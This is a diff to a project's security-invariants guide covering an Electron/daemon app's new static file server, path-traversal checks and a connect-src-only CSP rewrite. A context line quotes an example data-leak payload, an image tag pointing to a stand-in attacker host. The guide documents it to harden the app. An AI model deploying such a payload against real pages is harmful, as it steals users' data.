@@ -65,13 +65,24 @@ assumed — this skill is the codebase-specific layer beneath them.
   (4) **CORS is scoped, never `*`** — only the dev Vite origin (`PORCELAIN_ALLOWED_ORIGIN`)
   or the packaged `null` origin is echoed; the preflight carries nothing sensitive (the
   Bearer check on the real request is the gate). Don't relax any of these to "make local
-  dev easier."
+  dev easier." (5) **Static serving (Phase 3, `static-server.ts`) added a THIRD thing the
+  listener answers, but it widens nothing:** requests that aren't `/trpc` (or the `/session`
+  WS upgrade) get the renderer dist — GET/HEAD only, **unauthenticated by design** (the app
+  shell is not secret). It MUST stay this narrow: it only ever reads files INSIDE the
+  renderer dist root (`resolveStaticPath` decodes/normalizes then rejects any path escaping
+  the root — traversal, encoded `%2e%2e`, absolute, backslashes; unit-tested), NEVER reads
+  user files, and adds NO write surface. `/trpc` + `/session` remain the ONLY dynamic
+  endpoints and keep the token gate — static assets being open doesn't loosen them. The
+  index.html CSP rewrite (`rewriteCsp`) touches **only `connect-src`** (same-origin WS for
+  the request Host); `img-src`/`default-src` stay the artifact backstop, byte-identical.
+  Don't relax any of these to "make local dev easier."
   *Verify:* `rg -n "createServer|listen\(|http\.createServer" src/backend src/main src/mcp`
   hits the loopback listener in `src/backend/server.ts` AND the tailnet listener in
   `src/backend/tailnet-listener.ts` (at most those two) and nothing in `src/mcp`; the
   loopback `listen` still passes `'127.0.0.1'`, the tailnet `listen` binds only the
   `findTailscaleAddress()` result (never `0.0.0.0`), and both listeners share the same
-  Bearer + subprotocol checks.
+  Bearer + subprotocol checks; `resolveStaticPath`/`rewriteCsp` traversal + connect-src-only
+  tests in `static-server.test.ts` stay green.
 - **A spawned PTY's env is scrubbed of the daemon's internals** (`terminalEnv` in
   `src/backend/terminal-env.ts`, unit-tested). The daemon process env carries the session
   token and process-mode flags that must NEVER reach a user shell: `PORCELAIN_DAEMON_TOKEN`
@@ -202,9 +213,10 @@ assumed — this skill is the codebase-specific layer beneath them.
   (`<img src="https://attacker/?leak=...">`): never widen it (e.g. adding a remote host to
   `img-src`) while artifacts can render. The daemon split added `connect-src 'self'
   http://127.0.0.1:* ws://127.0.0.1:*` to the same CSP (the renderer must reach the local
-  daemon) — that loopback scope is deliberate and stays loopback-only until Phase 3 opens the
-  browser client; it does NOT relax `img-src`/`default-src`, which remain the artifact
-  backstop. Don't widen `connect-src` past loopback, and don't touch `img-src`/`default-src`. (3) Reads are zod-validated + size-capped on
+  daemon). That loopback scope is what the Electron window loads; when the daemon serves the
+  Phase-3 browser client it rewrites ONLY `connect-src` to same-origin WS for the request Host
+  (`rewriteCsp` in `static-server.ts`) — it does NOT relax `img-src`/`default-src`, which
+  remain the artifact backstop, and the rewrite must never touch them. Don't widen `img-src`/`default-src`, and keep the CSP rewrite connect-src-only. (3) Reads are zod-validated + size-capped on
   EVERY read (`readArtifact` drops an entry whose html exceeds `MAX_HTML_BYTES` = 1.5 MB, and
   never throws — one bad agent write can't break the viewer), because an external process owns the
   file. Same two-way shape as review-sets: the MCP server authors it, the app makes exactly ONE
